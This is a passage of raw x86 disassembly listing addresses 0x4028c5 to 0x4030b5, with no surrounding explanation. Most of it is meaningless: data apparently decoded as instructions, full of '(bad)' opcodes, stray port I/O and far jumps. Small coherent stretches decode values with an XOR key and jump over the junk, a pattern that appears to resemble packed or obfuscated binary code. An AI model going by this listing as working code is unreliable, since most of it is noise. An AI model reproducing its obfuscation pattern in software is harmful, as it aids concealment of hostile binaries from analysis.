  4028c5:	fst    DWORD PTR [esp+edi*4+0x339e7c96]
  4028cc:	pop    esp
  4028cd:	outs   dx,DWORD PTR ds:[esi]
  4028ce:	add    DWORD PTR [ecx-0x60e84de6],ebp
  4028d4:	nop
  4028d5:	pop    es
  4028d6:	dec    edx
  4028d7:	mov    bl,0x96
  4028d9:	xchg   BYTE PTR ds:0x2657935b,dh
  4028df:	jp     0x402909
  4028e1:	ret    0x7868
  4028e4:	imul   edi,DWORD PTR [edx+eiz*4-0x66],0x15
  4028e9:	fsub   DWORD PTR gs:[eiz*8+0x4b6c00d0]
  4028f1:	popf   
  4028f2:	arpl   WORD PTR [eax-0x7f],cx
  4028f5:	test   eax,0x4df6e30b
  4028fa:	stos   DWORD PTR es:[edi],eax
  4028fb:	add    dl,BYTE PTR [esi+0x45]
  4028fe:	xor    eax,esp
  402900:	test   DWORD PTR [eax+edi*4+0x2d],0x453b24c2
  402908:	imul   esi,DWORD PTR [edx],0xbb83b9d2
  40290e:	and    dh,BYTE PTR [ebx]
  402910:	enter  0xd3d9,0xf6
  402914:	not    BYTE PTR [ebx+eiz*8-0x2e8b6906]
  40291b:	repnz and ah,bl
  40291e:	test   al,0xc9
  402920:	hlt    
  402921:	fist   DWORD PTR [ebx+ecx*1]
  402924:	nop
  402925:	jge    0x4029a0
  402927:	(bad)  
  402929:	jae    0x402989
  40292b:	dec    eax
  40292c:	sbb    bh,BYTE PTR [ecx+0x242578e8]
  402932:	(bad)  
  402934:	int    0x51
  402936:	test   al,0xeb
  402938:	sbb    al,0x4c
  40293a:	pop    esi
  40293b:	aaa    
  40293c:	push   0x1aee9cfe
  402941:	adc    ebx,DWORD PTR [edx+0x5e3241ec]
  402947:	inc    edx
  402948:	mov    eax,ds:0x185632a8
  40294d:	je     0x4029c0
  40294f:	sbb    al,0xe3
  402951:	arpl   WORD PTR [edi],bx
  402953:	dec    esi
  402954:	inc    DWORD PTR [eax-0x10e68945]
  40295a:	sbb    eax,0xdf621b5f
  40295f:	mov    bh,0xab
  402961:	pusha  
  402962:	mov    ebx,0x4c1f5737
  402967:	clc    
  402968:	je     0x402959
  40296a:	push   ss
  40296b:	in     al,0xa3
  40296d:	dec    DWORD PTR ss:[ebp-0x1ba31acb]
  402974:	mov    BYTE PTR [eax+0x75ce53f9],ch
  40297a:	repnz pusha 
  40297c:	xor    DWORD PTR [edx-0x975cb91],0x13
  402983:	inc    edx
  402984:	aam    0xb4
  402986:	mov    ds:0x9dba7b16,eax
  40298b:	aaa    
  40298c:	xchg   edx,eax
  40298d:	sbb    al,0x30
  40298f:	jmp    0xfc22:0xb0e67163
  402996:	ss inc ebp
  402998:	mov    al,0xa
  40299a:	fstp   st(7)
  40299c:	xchg   edi,eax
  40299d:	test   BYTE PTR [ecx-0x2a],0xe6
  4029a1:	cmp    esi,DWORD PTR [edi]
  4029a3:	and    edx,DWORD PTR [edx+0x36]
  4029a6:	fstp   TBYTE PTR [eax]
  4029a8:	fscale 
  4029aa:	es pop esp
  4029ac:	dec    edx
  4029ad:	xchg   edi,eax
  4029ae:	mov    ?,WORD PTR [edx]
  4029b0:	and    BYTE PTR [edx-0x6],ch
  4029b3:	xor    bl,al
  4029b5:	jmp    DWORD PTR [ecx]
  4029b7:	jb     0x40297c
  4029b9:	add    BYTE PTR [esi-0x4b],0xf5
  4029bd:	(bad)  
  4029be:	jecxz  0x402942
  4029c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029c1:	jp     0x402991
  4029c3:	jmp    0x3aa3:0x3f0f528b
  4029ca:	sbb    ebx,DWORD PTR [edx]
  4029cc:	sub    DWORD PTR [ecx+eiz*8+0x200ddbd4],0xa9afbfde
  4029d7:	ror    BYTE PTR [edi*4+0xe2872ed],1
  4029de:	or     DWORD PTR [ecx],0xb
  4029e1:	pushf  
  4029e2:	imul   ebx,DWORD PTR [ebx],0xdfaafc0b
  4029e8:	push   ecx
  4029e9:	cmp    BYTE PTR [edx+0x40b284da],bl
  4029ef:	and    al,0x6d
  4029f1:	lods   eax,DWORD PTR ds:[esi]
  4029f2:	pop    eax
  4029f3:	fs jmp 0x9097dc87
  4029f9:	adc    eax,0xed011b3d
  4029fe:	outs   dx,DWORD PTR ds:[esi]
  4029ff:	mov    ch,0x59
  402a01:	test   eax,0xfd819fc
  402a06:	mov    ebx,fs
  402a08:	xor    BYTE PTR [esp+ebx*2-0x46],dl
  402a0c:	cmp    ebp,ebp
  402a0e:	and    DWORD PTR [esi],ecx
  402a10:	in     al,dx
  402a11:	sti    
  402a12:	cmp    ecx,DWORD PTR [ebx-0x7af02bbb]
  402a18:	add    eax,DWORD PTR [eax]
  402a1a:	add    BYTE PTR [eax],al
  402a1c:	mov    eax,DWORD PTR [ebp-0x10]
  402a1f:	xor    eax,esi
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	pop    eax
  402a35:	xor    DWORD PTR [edx+0x1c],ebx
  402a38:	stos   BYTE PTR es:[edi],al
  402a39:	or     eax,0x7ffa7e7e
  402a3e:	jle    0x402abe
  402a40:	or     BYTE PTR [edx+ecx*2+0x16e08491],cl
  402a47:	int3   
  402a48:	outs   dx,BYTE PTR ds:[esi]
  402a49:	arpl   WORD PTR [eax+0x44],di
  402a4c:	sbb    al,0xc3
  402a4e:	leave  
  402a4f:	dec    esi
  402a50:	leave  
  402a51:	outs   dx,DWORD PTR ds:[esi]
  402a52:	jl     0x4029fd
  402a54:	(bad)  
  402a55:	pop    ebp
  402a56:	and    BYTE PTR [esi],cl
  402a58:	mov    al,0xb2
  402a5a:	in     eax,0x1
  402a5c:	imul   ebp
  402a5e:	jg     0x4029e9
  402a60:	lahf   
  402a61:	clc    
  402a62:	sbb    dl,BYTE PTR [ebp+0x5a]
  402a65:	inc    ebp
  402a66:	nop
  402a67:	push   0x22b37ca9
  402a6c:	sbb    esp,DWORD PTR [edi+0x4194b018]
  402a72:	add    DWORD PTR [esi+0x778d3d9c],edx
  402a78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a79:	dec    ebp
  402a7a:	(bad)  
  402a7b:	pop    esp
  402a7c:	sbb    cl,BYTE PTR [edx]
  402a7e:	mov    esi,0x1e373efd
  402a83:	push   0xfffffff0
  402a85:	sub    BYTE PTR [edi],bl
  402a87:	mov    eax,0x963bcc33
  402a8c:	scas   al,BYTE PTR es:[edi]
  402a8d:	inc    esp
  402a8e:	pop    ebx
  402a8f:	gs stos DWORD PTR es:[edi],eax
  402a91:	ins    BYTE PTR es:[edi],dx
  402a92:	fdiv   DWORD PTR [eax+ebx*1+0x3930f348]
  402a99:	add    eax,0xde3f0863
  402a9e:	push   edx
  402a9f:	enter  0x468,0x73
  402aa3:	shr    DWORD PTR [ebp+eax*4+0x5e],0x11
  402aa8:	(bad)  
  402aaa:	clc    
  402aab:	loope  0x402ab6
  402aad:	cli    
  402aae:	loopne 0x402ac6
  402ab0:	inc    eax
  402ab1:	cmc    
  402ab2:	in     al,0x6d
  402ab4:	or     BYTE PTR [esi],al
  402ab6:	and    BYTE PTR [edi+0x5c],ah
  402ab9:	or     eax,0xd73c62c4
  402abe:	call   0xc4d8:0x2cac1c00
  402ac5:	sar    BYTE PTR [eax],0xb4
  402ac8:	jnp    0x402af4
  402aca:	cmp    al,0x7a
  402acc:	data16 jne 0x402b3a
  402acf:	jne    0x402b11
  402ad1:	not    DWORD PTR [edx-0x252dc1bc]
  402ad7:	jno    0x402ae8
  402ad9:	daa    
  402ada:	inc    ebx
  402adb:	(bad)  
  402adc:	mov    esp,0x5db09bbe
  402ae1:	(bad)  
  402ae2:	mov    ah,0x3c
  402ae4:	jb     0x402afb
  402ae6:	cmp    eax,0xba29e39c
  402aeb:	pop    ss
  402aec:	dec    esp
  402aed:	mov    WORD PTR [ecx-0x56],ss
  402af0:	pushf  
  402af1:	pandn  mm6,QWORD PTR [eax]
  402af4:	dec    edx
  402af5:	test   BYTE PTR [ebx+eax*2],bl
  402af8:	loope  0x402af1
  402afa:	dec    esi
  402afb:	(bad)  
  402afc:	add    eax,0x1ad16a95
  402b01:	into   
  402b02:	push   ebx
  402b03:	xor    edi,0xb
  402b06:	add    ch,ah
  402b08:	add    dh,0xed
  402b0b:	cmp    ebx,DWORD PTR [edx]
  402b0d:	mov    cl,BYTE PTR [esi]
  402b0f:	pop    ds
  402b10:	mov    ebp,0xbc8f59c1
  402b15:	dec    esi
  402b16:	inc    ebp
  402b17:	mov    ebp,ebp
  402b19:	iret   
  402b1a:	mov    cl,0x3e
  402b1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b1d:	fisttp WORD PTR ds:0xe334d0d9
  402b23:	mov    ebp,0x772a962
  402b28:	push   cs
  402b29:	dec    esp
  402b2a:	pop    ebp
  402b2b:	fcmovb st,st(0)
  402b2d:	or     al,BYTE PTR [ebx]
  402b2f:	das    
  402b30:	cmp    ch,BYTE PTR ds:0x346a6360
  402b36:	out    0x64,eax
  402b38:	sub    dl,BYTE PTR [edi+0x53]
  402b3b:	add    bh,BYTE PTR gs:[ecx-0x6208e8aa]
  402b42:	inc    ebp
  402b43:	jnp    0x402bbc
  402b45:	dec    esp
  402b46:	jge    0x402b67
  402b48:	jmp    FWORD PTR [ebx]
  402b4a:	sub    ah,ch
  402b4c:	pop    ds
  402b4d:	repnz adc BYTE PTR [ecx],cl
  402b50:	ret    0xd0f2
  402b53:	mov    dh,0xc2
  402b55:	scas   eax,DWORD PTR es:[edi]
  402b56:	fild   WORD PTR [edx-0x26]
  402b59:	sbb    ebp,eax
  402b5b:	sbb    eax,0xbbd3ba34
  402b60:	pushf  
  402b61:	pop    ss
  402b62:	add    BYTE PTR ds:0x33113cd4,dh
  402b68:	mov    dh,0x6c
  402b6a:	sti    
  402b6b:	add    DWORD PTR [edx+0x14],ebx
  402b6e:	mov    ah,0xdd
  402b70:	icebp  
  402b71:	jo     0x402bd7
  402b73:	jg     0x402b2c
  402b75:	add    eax,DWORD PTR [ecx]
  402b77:	mov    ebp,0xa7040a3b
  402b7c:	jo     0x402bbf
  402b7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b7f:	mov    eax,0xcdf2b29d
  402b84:	stc    
  402b85:	mov    ds:0x9acfa5b3,eax
  402b8a:	popf   
  402b8b:	dec    ecx
  402b8c:	loop   0x402bc5
  402b8e:	data16 mov WORD PTR [ecx+0x38],ss
  402b92:	mov    dl,0x1e
  402b94:	sub    BYTE PTR [eax],bh
  402b96:	mov    edx,0x421e96ea
  402b9b:	ss jp  0x402b8e
  402b9e:	xor    eax,0xf8dca8b7
  402ba3:	mov    fs,WORD PTR [esi-0x5c6359e3]
  402ba9:	iret   
  402baa:	jecxz  0x402b96
  402bac:	mov    al,ds:0xf602f464
  402bb1:	push   es
  402bb2:	arpl   WORD PTR [ebx+edx*8-0x35832afc],ax
  402bb9:	mov    ah,0x2f
  402bbb:	mov    eax,0xf015cb32
  402bc0:	pop    ebp
  402bc1:	xor    eax,0xc0851a45
  402bc6:	je     0x402bf4
  402bcc:	lea    eax,[ebp-0x98]
  402bd2:	push   eax
  402bd3:	mov    eax,DWORD PTR [ebp-0x1c]
  402bd6:	xor    eax,esi
  402bd8:	add    eax,edi
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	sbb    DWORD PTR [ebx+0x6f],0x7e0b36f6
  402c18:	jle    0x402c14
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402c35
  402c1e:	adc    bl,BYTE PTR [esi+0x25613c0b]
  402c24:	(bad)  
  402c25:	xchg   ebp,eax
  402c26:	call   0xb6b8e056
  402c2b:	jno    0x402c77
  402c2d:	pop    ss
  402c2e:	arpl   WORD PTR [edx-0x2cee61a7],bp
  402c34:	aam    0x4e
  402c36:	icebp  
  402c37:	fstp   QWORD PTR [eax]
  402c39:	add    DWORD PTR ds:0xae15745e,ebx
  402c3f:	sbb    DWORD PTR [edx+edi*4],edx
  402c42:	ins    DWORD PTR es:[edi],dx
  402c43:	push   edx
  402c44:	sar    BYTE PTR [ebx],0x1f
  402c47:	or     ebx,edx
  402c49:	ror    DWORD PTR [eax+0x5b],0x2d
  402c4d:	sub    dl,BYTE PTR [edi]
  402c4f:	inc    esi
  402c50:	mov    ds:0x2cc570c4,eax
  402c55:	jnp    0x402c3e
  402c57:	in     eax,dx
  402c58:	or     dl,0x89
  402c5b:	mov    dl,0xaa
  402c5d:	das    
  402c5e:	ds mov ecx,0x58d1febb
  402c64:	and    BYTE PTR [edi+0x2552c876],bh
  402c6a:	inc    edx
  402c6b:	add    eax,DWORD PTR [ebx+0x4fd011fb]
  402c71:	sbb    edx,DWORD PTR ss:0x3f40304e
  402c78:	inc    esi
  402c79:	jnp    0x402c92
  402c7b:	arpl   WORD PTR [ebx+0x68],si
  402c7e:	adc    bl,BYTE PTR [edi+0x31f9f772]
  402c84:	outs   dx,DWORD PTR ds:[esi]
  402c85:	cli    
  402c86:	mov    bl,0x22
  402c88:	or     eax,0x38025e87
  402c8d:	mov    eax,ds:0x354eae19
  402c92:	icebp  
  402c93:	mov    dh,0x59
  402c95:	test   DWORD PTR [ebx-0x1e45ab18],ebx
  402c9b:	cmp    BYTE PTR [ecx+0x5c],dl
  402c9e:	push   ebp
  402c9f:	js     0x402ccf
  402ca1:	test   eax,0x30922fad
  402ca6:	outs   dx,BYTE PTR ds:[esi]
  402ca7:	add    eax,0x7c708e69
  402cac:	ds inc eax
  402cae:	mov    al,ds:0x7eff5f36
  402cb3:	mov    esp,0x711ee708
  402cb8:	add    DWORD PTR [edx+0x67],ebx
  402cbb:	xor    eax,0x328426aa
  402cc0:	mov    ?,WORD PTR [edx]
  402cc2:	cld    
  402cc3:	test   al,0x4d
  402cc5:	mov    BYTE PTR [ecx],ch
  402cc7:	or     ch,BYTE PTR [eax+0x22c5ad0f]
  402ccd:	sbb    ah,BYTE PTR [ebx+0x7d]
  402cd0:	or     edx,DWORD PTR [ebx-0x59]
  402cd3:	jne    0x402ca3
  402cd5:	mov    bh,0x70
  402cd7:	inc    ebp
  402cd8:	repnz cmp al,0x90
  402cdb:	dec    edx
  402cdc:	sbb    ch,0xa
  402cdf:	mov    bh,0xcf
  402ce1:	fmul   DWORD PTR [ebp-0x12]
  402ce4:	or     eax,0x4a0bd40b
  402ce9:	add    dh,BYTE PTR [edx+0x5ba80f71]
  402cef:	rcl    DWORD PTR [eax],1
  402cf1:	xchg   DWORD PTR [esi+0x34d29c70],esp
  402cf7:	lock jge 0x402cec
  402cfa:	add    ch,BYTE PTR [esi]
  402cfc:	mul    DWORD PTR [eax]
  402cfe:	sub    cl,BYTE PTR [esi-0x40]
  402d01:	mov    WORD PTR [eax+edx*1+0x6f821e11],fs
  402d08:	call   0xb068:0xbae7f726
  402d0f:	jl     0x402d2f
  402d11:	push   cs
  402d12:	int3   
  402d13:	das    
  402d14:	loop   0x402cc2
  402d16:	jecxz  0x402ce7
  402d18:	lods   eax,DWORD PTR ds:[esi]
  402d19:	jge    0x402d4f
  402d1b:	lock dec ebx
  402d1d:	jge    0x402d50
  402d1f:	out    0x88,al
  402d21:	int3   
  402d22:	aam    0x29
  402d24:	and    esp,esi
  402d26:	push   ss
  402d27:	ja     0x402d67
  402d29:	adc    al,0x9a
  402d2b:	lds    edx,FWORD PTR [ecx-0x5]
  402d2e:	dec    ebp
  402d2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d30:	add    al,0xc
  402d32:	aaa    
  402d33:	idiv   BYTE PTR [edi]
  402d35:	inc    ebp
  402d36:	enter  0x4545,0xf6
  402d3a:	lods   al,BYTE PTR ds:[esi]
  402d3b:	cwde   
  402d3c:	mov    ah,0x5b
  402d3e:	mov    edi,0xde537479
  402d43:	icebp  
  402d44:	xchg   edx,eax
  402d45:	sbb    dh,BYTE PTR [eax]
  402d47:	mov    bl,bh
  402d49:	jnp    0x402d97
  402d4b:	nop
  402d4c:	bnd jbe 0x402d4d
  402d4f:	lahf   
  402d50:	mov    ss,WORD PTR [ebx+0x623906a9]
  402d56:	(bad)  [ebp+0xa951903]
  402d5c:	push   ebp
  402d5d:	rol    BYTE PTR [ebx+0x28],1
  402d60:	or     cl,dl
  402d62:	int    0xe4
  402d64:	mov    dh,BYTE PTR [ebx-0x1c]
  402d67:	je     0x402d5e
  402d69:	rol    DWORD PTR [eax],0xcd
  402d6c:	sub    eax,0xb9adb620
  402d71:	loope  0x402d90
  402d73:	or     al,0x1b
  402d75:	outs   dx,BYTE PTR ds:[esi]
  402d76:	std    
  402d77:	push   ecx
  402d78:	xchg   esi,eax
  402d79:	pop    edx
  402d7a:	pop    eax
  402d7b:	push   edx
  402d7c:	xor    eax,0x931c7500
  402d81:	jge    0x402dfd
  402d83:	dec    ebp
  402d84:	retf   0x7163
  402d87:	mov    al,0xff
  402d89:	(bad)  
  402d8a:	out    0x95,al
  402d8c:	hlt    
  402d8d:	cwde   
  402d8e:	test   DWORD PTR [edx-0x4e],esp
  402d91:	sbb    eax,0xd78a6b5a
  402d96:	dec    edx
  402d97:	lods   eax,DWORD PTR ds:[esi]
  402d98:	frstor [ebx]
  402d9a:	test   al,0x24
  402d9c:	jmp    0x452b:0x2cf8c05d
  402da3:	cld    
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [eax+ebx*1-0x51],1
  402de7:	fistp  WORD PTR ds:0x7e7e08b2
  402ded:	cli    
  402dee:	jg     0x402e6e
  402df0:	jle    0x402e70
  402df2:	imul   eax,ebp,0xffffffb8
  402df5:	es mov ecx,ecx
  402df8:	(bad)  
  402df9:	call   0x63423fb
  402dfe:	jae    0x402dcd
  402e00:	daa    
  402e01:	inc    eax
  402e02:	push   esp
  402e03:	pop    esi
  402e04:	jmp    0x3146ced7
  402e09:	aas    
  402e0a:	cs (bad) 
  402e0d:	push   edx
  402e0e:	dec    edi
  402e0f:	pushf  
  402e10:	pop    es
  402e11:	dec    edx
  402e12:	or     dh,ch
  402e14:	xor    eax,0x1b0a93
  402e19:	jmp    0x6e7d:0x37dada9e
  402e20:	daa    
  402e21:	push   es
  402e22:	xor    al,0xf6
  402e24:	sub    BYTE PTR [esi+0x26c80dc4],al
  402e2a:	das    
  402e2b:	mov    eax,0x61cc8575
  402e30:	adc    eax,0xa192d293
  402e35:	dec    edi
  402e36:	inc    eax
  402e37:	add    al,bh
  402e39:	push   es
  402e3a:	mov    ebx,0x96cd7990
  402e3f:	lods   eax,DWORD PTR ds:[esi]
  402e40:	fldcw  WORD PTR [edi+0x7]
  402e43:	push   0xbf879e69
  402e48:	mov    eax,0x873e6dc3
  402e4d:	pop    ebp
  402e4e:	pop    edi
  402e4f:	xor    bl,bl
  402e51:	cli    
  402e52:	(bad)  
  402e53:	frstor [edx+eiz*8+0x58]
  402e57:	aam    0xe4
  402e59:	push   es
  402e5a:	jecxz  0x402ea2
  402e5c:	dec    ecx
  402e5d:	xchg   ecx,eax
  402e5e:	fimul  WORD PTR [edx]
  402e60:	pusha  
  402e61:	int    0x6f
  402e63:	pop    ebx
  402e64:	jge    0x402e1a
  402e66:	mov    cl,0xec
  402e68:	lds    esp,FWORD PTR [eax+eiz*2]
  402e6b:	xchg   ebp,ebx
  402e6d:	in     al,0xec
  402e6f:	and    ebp,ebx
  402e71:	dec    esp
  402e72:	jmp    0x387c:0x5300f2c5
  402e79:	push   ebx
  402e7a:	dec    edx
  402e7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e7c:	sub    BYTE PTR [esi+0x268fcb2b],dl
  402e82:	add    al,0xd2
  402e84:	and    DWORD PTR [edi+0x10],0x4
  402e88:	jb     0x402f05
  402e8a:	out    dx,eax
  402e8b:	repnz cdq 
  402e8d:	dec    edi
  402e8e:	mov    ebx,ds
  402e90:	out    dx,al
  402e91:	lods   al,BYTE PTR ds:[esi]
  402e92:	adc    DWORD PTR ds:0xa931b3f8,edi
  402e98:	(bad)  
  402e99:	push   edi
  402e9a:	ja     0x402ed5
  402e9c:	call   0xe5d:0x4f2655c7
  402ea3:	jg     0x402e8d
  402ea5:	out    0x52,al
  402ea7:	ret    
  402ea8:	imul   eax,ebx,0x3e3c0c0d
  402eae:	mov    al,ds:0xed8b1055
  402eb3:	es das 
  402eb5:	or     al,0xe3
  402eb7:	(bad)  
  402eb8:	mov    ds:0x23fbb5c8,eax
  402ebd:	(bad)  [esp+esi*1-0x4cb15d6]
  402ec4:	mov    ecx,0xb73f45a7
  402ec9:	or     al,0xd8
  402ecb:	pop    esp
  402ecc:	(bad)  
  402ecd:	jmp    0x402e9a
  402ecf:	(bad)  
  402ed0:	sub    al,0xad
  402ed2:	cwde   
  402ed3:	les    esp,FWORD PTR [ecx+ecx*8-0x2b]
  402ed7:	ja     0x402e7b
  402ed9:	retf   
  402eda:	rol    BYTE PTR [ecx+ebx*1+0x5d],0xe
  402edf:	and    ebp,DWORD PTR [edx]
  402ee1:	fcmovbe st,st(3)
  402ee3:	jns    0x402f36
  402ee5:	inc    edi
  402ee6:	hlt    
  402ee7:	int3   
  402ee8:	adc    BYTE PTR [edi+edx*8-0x5b],dl
  402eec:	or     al,0x85
  402eee:	adc    ebp,DWORD PTR [edi+0x550587e2]
  402ef4:	adc    BYTE PTR [ebx],0x3
  402ef7:	shl    DWORD PTR [eax+0x59eefe11],cl
  402efd:	inc    edx
  402efe:	or     DWORD PTR [ecx+0x1840202b],ebp
  402f04:	scas   eax,DWORD PTR es:[edi]
  402f05:	mov    ebp,0x276640bd
  402f0a:	xchg   edx,eax
  402f0b:	pop    eax
  402f0c:	xor    al,0x19
  402f0e:	(bad)  [ecx]
  402f10:	aas    
  402f11:	(bad)  
  402f12:	je     0x402ee1
  402f14:	pop    ebp
  402f15:	sub    DWORD PTR [edx+0x31ff44b5],edi
  402f1b:	push   esi
  402f1c:	push   eax
  402f1d:	retf   
  402f1e:	cmp    BYTE PTR [esi-0x7c9e57e7],bh
  402f24:	dec    ecx
  402f25:	ja     0x402efa
  402f27:	(bad)  
  402f29:	ins    DWORD PTR es:[edi],dx
  402f2a:	sub    al,0xb9
  402f2c:	sbb    eax,0x68522079
  402f31:	dec    esp
  402f32:	retf   
  402f33:	push   cs
  402f34:	je     0x402eee
  402f36:	lea    ebp,[ecx]
  402f38:	jb     0x402ec9
  402f3a:	stc    
  402f3b:	and    esp,eax
  402f3d:	push   DWORD PTR [edx-0x1a444f59]
  402f43:	pushf  
  402f44:	dec    ebx
  402f45:	xchg   DWORD PTR [eax+ebx*2+0x78],ebp
  402f49:	and    cl,BYTE PTR [eax]
  402f4b:	cdq    
  402f4c:	test   BYTE PTR ds:0x4b96242,bl
  402f52:	mov    bl,0x6d
  402f54:	aad    0xf7
  402f56:	es push eax
  402f58:	hlt    
  402f59:	mov    edx,0xa8444274
  402f5e:	and    eax,0xa4259344
  402f63:	inc    esi
  402f64:	push   esi
  402f65:	nop
  402f66:	rcr    BYTE PTR [edi-0x49],0x6
  402f6a:	sbb    BYTE PTR [ebx+eax*2],ch
  402f6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f6e:	xor    DWORD PTR [edi],ecx
  402f70:	jne    0x402f0c
  402f72:	rep ins DWORD PTR es:[edi],dx
  402f74:	mov    ah,0x8d
  402f76:	add    eax,0x413c0c
  402f7b:	push   DWORD PTR [eax]
  402f7d:	lea    eax,ds:0x4139b8
  402f83:	push   DWORD PTR [eax]
  402f85:	lea    eax,ds:0x413bec
  402f8b:	push   DWORD PTR [eax]
  402f8d:	lea    eax,ds:0x413d34
  402f93:	push   DWORD PTR [eax]
  402f95:	xchg   ebx,edx
  402f97:	inc    ebx
  402f98:	inc    ebx
  402f99:	push   ebx
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi-0x202c5a49]
  402fae:	dec    edi
  402faf:	aaa    
  402fb0:	ds push ss
  402fb2:	jle    0x403032
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x403038
  402fb9:	aad    0xaf
  402fbb:	pop    es
  402fbc:	mov    edi,0xf595450a
  402fc1:	adc    al,0x86
  402fc3:	xor    al,0xff
  402fc5:	mov    dh,0xec
  402fc7:	and    eax,0xa39c2606
  402fcc:	xchg   ecx,eax
  402fcd:	out    dx,eax
  402fce:	mov    ah,0x2f
  402fd0:	mov    ds:0xcf714854,al
  402fd5:	pop    ds
  402fd6:	sub    cl,BYTE PTR [esi+0x39]
  402fd9:	pop    esi
  402fda:	mov    bh,BYTE PTR [edi]
  402fdc:	sub    cl,BYTE PTR [ebx+0x57]
  402fdf:	mov    bl,0x0
  402fe1:	push   ebx
  402fe2:	push   esi
  402fe3:	mov    edi,0xb8bcbba
  402fe8:	loopne 0x403057
  402fea:	sbb    al,0x7f
  402fed:	xlat   BYTE PTR ds:[ebx]
  402fee:	imul   ebp,DWORD PTR [ebx-0x52],0x7c04f99e
  402ff5:	sub    BYTE PTR [ecx],dh
  402ff7:	(bad)  
  402ff8:	sub    al,0x86
  402ffa:	out    dx,al
  402ffb:	jnp    0x403035
  402ffd:	jo     0x402ffb
  402fff:	mov    DWORD PTR [esi],esp
  403001:	fidiv  WORD PTR ds:0x9d4080e5
  403007:	les    eax,FWORD PTR [edi+0x6f]
  40300a:	cmp    esp,edx
  40300c:	mov    edi,DWORD PTR gs:[edx-0x72]
  403010:	inc    ebx
  403011:	mov    ah,0xd9
  403013:	jmp    0xb77:0x8169
  403019:	popf   
  40301a:	xchg   esi,eax
  40301b:	push   es
  40301c:	cdq    
  40301d:	cmc    
  40301e:	mov    edi,0x5bd185b5
  403023:	adc    al,0xc5
  403025:	and    cl,bh
  403027:	call   0x69a9:0x91b923c8
  40302e:	ss dec edi
  403030:	push   esp
  403031:	jno    0x403046
  403033:	(bad)  
  403034:	pusha  
  403035:	sahf   
  403036:	mov    esi,DWORD PTR [edi+0x662cdb07]
  40303c:	dec    edx
  40303d:	hlt    
  40303e:	mov    esi,0xc515578f
  403043:	call   0x9caa9f16
  403048:	fdiv   QWORD PTR [edx-0x1e0a3e7b]
  40304e:	pop    edx
  40304f:	jle    0x403011
  403051:	ret    
  403052:	add    ah,BYTE PTR [esi]
  403054:	popf   
  403055:	loop   0x403078
  403057:	add    BYTE PTR [edx],cl
  403059:	shr    esi,1
  40305b:	addr16 jg 0x40303e
  40305e:	push   ebx
  40305f:	imul   esp,DWORD PTR [edi+edx*4],0x32
  403063:	in     eax,dx
  403064:	lahf   
  403065:	mov    esp,0xc13fab0f
  40306a:	mov    bh,0xe6
  40306c:	pop    ebp
  40306d:	arpl   WORD PTR [edi],si
  40306f:	or     DWORD PTR [edx+0x33387f02],0xf4d2a886
  403079:	sub    al,0x3
  40307b:	shr    DWORD PTR [edx],cl
  40307d:	push   ds
  40307e:	and    BYTE PTR ds:0x44aa3e99,dh
  403084:	sub    ecx,0x71a29efb
  40308a:	popf   
  40308b:	dec    edi
  40308c:	pusha  
  40308d:	or     ebp,ecx
  40308f:	sub    BYTE PTR [edi],al
  403091:	mov    edx,ds
  403093:	js     0x40310e
  403095:	mov    ebp,DWORD PTR [ebp-0x2ce003d8]
  40309b:	mov    ds:0xf3e234bc,eax
  4030a0:	push   ebp
  4030a1:	cmp    eax,0x6a031577
  4030a6:	sub    bl,BYTE PTR gs:[esi]
  4030a9:	push   es
  4030aa:	jae    0x403056
  4030ac:	ja     0x403044
  4030ae:	ins    BYTE PTR es:[edi],dx
  4030af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030b0:	sbb    BYTE PTR [eax],al
  4030b2:	xor    BYTE PTR [eax-0x60],dh
  4030b5:	(bad)  
